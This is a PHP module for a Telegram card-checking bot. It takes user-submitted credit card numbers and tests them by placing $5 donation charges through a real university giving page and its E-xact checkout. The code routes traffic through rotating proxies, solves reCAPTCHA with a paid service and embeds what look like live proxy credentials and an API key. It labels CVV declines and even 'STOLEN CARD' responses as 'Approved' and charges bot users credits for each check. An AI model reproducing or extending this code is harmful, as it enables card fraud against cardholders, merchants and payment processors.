<?php


$gatewayname="ex";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#EXact_Chase_CCN (".'$ex'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($ano) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];

switch (substr($cc, 0, 1)) {
    case '3':
        $type = "Amex";
        break;
    case '5':
        $type = "MasterCard";
        break;
    case '6':
        $type = "Discover";
        break;
    default:
        $type = "Visa";
        break;
}
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);

 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $socks5 = "gw.dataimpulse.com:823";
 $rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";
 
 $cookie = uniqid();
 
 
 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 
 $response = CurlX::Post(
    "https://alumniapps2.dal.ca/giving_ajax/submit",
    'page=1&frequency=1&payroll-banner-id=&payroll-pledge-option=1&duration=0&payment-count=&amount-select=999&amount-text=%24+5.00&designation-method=browse&faculty-select=Art+Gallery&department-select=Art+Gallery&designation-select=AG00890&fill-in-text=&fill-in-value=&designation-text=&designation-code=&amount-text-2=&faculty-select-2=&department-select-2=&designation-select-2=&fill-in-text-2=&fill-in-value-2=&designation-text-2=&designation-code-2=&amount-text-3=&faculty-select-3=&department-select-3=&designation-select-3=&fill-in-text-3=&fill-in-value-3=&designation-text-3=&designation-code-3=&amount-text-4=&faculty-select-4=&department-select-4=&designation-select-4=&fill-in-text-4=&fill-in-value-4=&designation-text-4=&designation-code-4=&amount-text-5=&faculty-select-5=&department-select-5=&designation-select-5=&fill-in-text-5=&fill-in-value-5=&designation-text-5=&designation-code-5=&dedication-name=&dedication-notify-name=&dedication-notify-email=&dedication-notify-street=&dedication-notify-city=&dedication-notify-country-select=&dedication-notify-state-select=&dedication-notify-state-text=&dedication-notify-postal-code=',
    [
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: https://alumniapps2.dal.ca',
        'Referer: https://alumniapps2.dal.ca/',
        
    ],
    $cookie,
    $proxies
);
sleep(4);
$response = CurlX::Post(
    "https://alumniapps2.dal.ca/giving_ajax/submit",
    'page=2&page-last=1&salutation=Dr&first-name=Angel&last-name=Lopes&street1=4545140205&street2=Frah&city=YO6+7GD&country-select=GB&state-select=&state-text=Please+select+region%2C+state+or+province&postal-code=YO6+7GD&email=frangelotorrez1%40gmail.com&phone=4125594378&affiliation-select=6&affiliation-text=lol&alumni-faculty=&alumni-degree=&alumni-degree-year=&alumni-student-id=&staff-banner-id=&comment=',
    [
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: https://alumniapps2.dal.ca',
        'Referer: https://alumniapps2.dal.ca/',
        
    ],
    $cookie,
    $proxies
);
 $x_login=CurlX::ParseString($response->body,'name=\"x_login\"         value=\"',"\\");
 $x_fp_sequence=CurlX::ParseString($response->body,'name=\"x_fp_sequence\"   value=\"',"\\");
 $x_fp_timestamp=CurlX::ParseString($response->body,' name=\"x_fp_timestamp\"  value=\"',"\\");
 $x_fp_hash=CurlX::ParseString($response->body,' name=\"x_fp_hash\"       value=\"',"\\");
echo $x_invoice_num=CurlX::ParseString($response->body,' name=\"x_invoice_num\"   value=\"',"\\");

$response = CurlX::Post(
    "https://checkout.e-xact.com/payment",
    'x_login='.$x_login.'&x_fp_sequence='.$x_fp_sequence.'&x_fp_timestamp='.$x_fp_timestamp.'&x_fp_hash='.$x_fp_hash.'&x_po_num='.$x_invoice_num.'&x_invoice_num='.$x_invoice_num.'&x_reference_3=ONLINE_GIVING_ONETIME&x_currency_code=CAD&x_amount=5&x_first_name=Angel&x_last_name=Lopes&x_address=Street+Avenue+3xxx+Frah&x_city=Miami&x_state=Florida&x_zip=33010&x_country=United+States&x_phone=04125594378&x_email=frangelotorrez1%40gmail.com&x_show_form=PAYMENT_FORM',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://alumniapps2.dal.ca',
        'referer: https://alumniapps2.dal.ca/',
        
    ],
    $cookie,
    $proxies
);
$solver = new CapSolver('CAP-0DC8A5669BCC3BACE0A04D2AA3C14585');

$maxRetries = 3;
$attempts = 0;
$solved = false;

while ($attempts < $maxRetries && !$solved) {
    try {
        // Resolver el captcha
        $solution = $solver->recaptchav2('ReCaptchaV2EnterpriseTaskProxyLess', [
            'websiteURL' => 'https://checkout.e-xact.com', // URL donde está implementado el captcha
            'websiteKey' => '6LegeOMkAAAAAH2xnPPldKJX-HXlEtGkhkDb-FZi', // Clave del sitio 
            'apiDomain' => 'www.recaptcha.net'
        ]);

        if (isset($solution['gRecaptchaResponse'])) {
            $CaptchaResponse = $solution['gRecaptchaResponse'];
             "Respuesta del captcha $CaptchaResponse\n";
            $solved = true;
        } else {
            throw new Exception("No se obtuvo un token válido.");
        }
    } catch (Exception $e) {
        $attempts++;
        echo "Intento {$attempts} fallido: " . $e->getMessage() . "\n";
        if ($attempts >= $maxRetries) {
            echo "Se alcanzó el número máximo de reintentos.\n";
            echo "Última respuesta del servidor:\n";
            print_r($solution); // Imprime el array completo de forma segura
        }
    }
}

$response = CurlX::Post(
    "https://checkout.e-xact.com/payment/cc_payment",
    'jmsg=453241219&exact_cardholder_name=alejandro+Jose&servdt5=1&merchant=WSP-DALHO-IlRVSgARAw&x_card_num='.$cc.'&x_exp_date='.$mes.$ano1.'&x_card_code='.$cvv.'&cvd_presence_ind=1&g-recaptcha-response='.$CaptchaResponse.'&commit=Pay+With+Your+Credit+Card',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://checkout.e-xact.com',
        
    ],
    $cookie,
    $proxies
);



// ==================[Manejo de los mensajes]====================== //
$avs = trim(CurlX::ParseString($response->body, 'name="AVS" id="AVS" value="', '"'));
$errormessage = trim(CurlX::ParseString($response->body, 'name="Bank_Message" id="Bank_Message" value="', '"'));
$exactmessage = trim(CurlX::ParseString($response->body, 'name="EXact_Message" id="EXact_Message" value="', '"'));
$code = trim(CurlX::ParseString($response->body, 'name="Bank_Resp_Code" id="Bank_Resp_Code" value="', '"'));


$dom = new DOMDocument();
libxml_use_internal_errors(true); 
$dom->loadHTML($response->body);
libxml_clear_errors(); 


$xpath = new DOMXPath($dom);
$errorDiv = $xpath->query("//div[@id='error']");


if ($errorDiv->length > 0) {
    // Si existe el div con id "error", extraer el mensaje del h1 y la descripción del p
    $errorMessageNode = $xpath->query(".//h1", $errorDiv[0]);
    $errorDescriptionNode = $xpath->query(".//p", $errorDiv[0]);

    $errorMessage = $errorMessageNode->length > 0 ? trim($errorMessageNode->item(0)->nodeValue) : 'Error message not found';
    $errorDescription = $errorDescriptionNode->length > 0 ? trim($errorDescriptionNode->item(0)->nodeValue) : 'Error description not found';


    $errormessage = $errorMessage . " - " . $errorDescription;
}


if ( $errormessage==="null") {
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/" . str_replace(' ', '', trim($gateway)) . ".txt", $response->body);
    // Guardar la respuesta en un archivo para depuración
    
}

 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if(($errormessage=="APPROVED")){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved", "en", $lang)." CCN✅",
            "$errormessage $code
Code: $exactmessage Avs: $avs",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);

 }
 elseif($messagecode=="Insufficient Funds"){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            "$errormessage $code
Code: $exactmessage Avs: $avs ",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif(strpos($response->body,"Unable to proceed with payment")){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Declined!❌", "en", $lang),
            "Declined: Unable to proceed with payment",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }

 elseif($errormessage=="ERROR: ((6)) DECLINED: INCORRECT CVV  Please try again or contact us for assistance."){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved", "en", $lang)." CCN✅",
            "SUCCESS
Code: 002115 AVS: R",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)"){
    
    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "ERROR: ((6)) DECLINED: STOLEN CARD Please try again or contact us for assistance."){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
           $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code avs_and_cvv: Gateway Rejected: avs_and_cvv"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code 2010: Card Issuer Declined CVV"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "There was a problem processing the request"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Declined!❌", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
        "$errormessage
Code: $exactmessage Avs: $avs ",
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
